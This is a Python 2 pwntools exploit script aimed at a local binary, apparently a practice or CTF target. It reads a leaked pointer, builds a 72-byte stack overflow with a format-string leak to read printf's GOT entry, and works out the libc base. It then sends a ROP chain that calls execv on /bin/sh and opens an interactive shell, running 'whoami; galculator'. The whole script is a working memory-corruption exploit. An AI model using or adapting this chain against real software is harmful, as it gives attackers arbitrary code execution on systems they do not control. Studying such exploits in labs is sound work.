#!/usr/bin/python2
from pwn import *
import sys


p = process(sys.argv[1])


s = ELF(sys.argv[1])


libc = ELF('/usr/lib/libc.so.6')

print("Libc printf " + hex(libc.symbols['printf']))

printearlyofs = s.symbols['main'] - (s.symbols['leakfun']+8)
printofs = s.symbols['main'] - (s.symbols['leakfun']+8+7)

print(hex(s.got['printf']))

rsiofs = s.symbols['main'] - 0x00001231
rdiofs = s.symbols['main'] - 0x00001233
binshofs = s.symbols['main'] - 0x00002043

printgotofs = s.symbols['main'] - s.got['printf']





p.recvuntil(':')
leakptr = int(p.recvline().strip(), 16)
print("Leaked ptr " + hex(leakptr))

printloc = leakptr - printofs
printearlyloc = leakptr - printearlyofs
rsiloc = leakptr - rsiofs
rdiloc = leakptr - rdiofs
binshloc = leakptr - binshofs
printgotloc = leakptr - printgotofs
smashfunloc = leakptr - (s.symbols['main'] - s.symbols['smashfun'])

print("Printfofs " + hex(printloc))
print("rsiloc " + hex(rsiloc))
print("binshloc " + hex(binshloc))

##p.sendline('A' * 64 + 'B' * 8 + p64(printloc))
fmtstring = '''a:%.8s'''
print(fmtstring)
##sleep(5)





strang = (fmtstring + p8(0) + 'b' * (72 -(len(fmtstring) + 1)) + p64(rsiloc) + p64(printgotloc) + 'C' * 8 + p64(printloc)) + 'D' * 8 + p64(printearlyloc) \
	+ 'E' * 8 + p64(smashfunloc)
print(strang)
p.sendline(strang)
p.recvuntil(':')
#p.interactive()
gotgot = p.recvuntil('Leaking').split("Leaking")[0]
gotgot += '\x00' * (8-len(gotgot))
gotgot = u64(gotgot)
print("yah yah yeet! " + hex(gotgot))
print("libc start " + hex(gotgot - libc.symbols['printf']))
p.recvuntil('main:')
p.recvline()


##sleep(5)

p.sendline('b' * 72 + \
	p64(rsiloc) + p64(0) + 'C' * 8 + \
	p64(rdiloc) + p64(gotgot - (libc.symbols['printf'] - 0x00186cee)) + \
	p64(gotgot - (libc.symbols['printf'] - libc.symbols['execv'])+4) )


p.recvuntil('no', timeout=1)
p.sendline('whoami; galculator')
p.interactive()
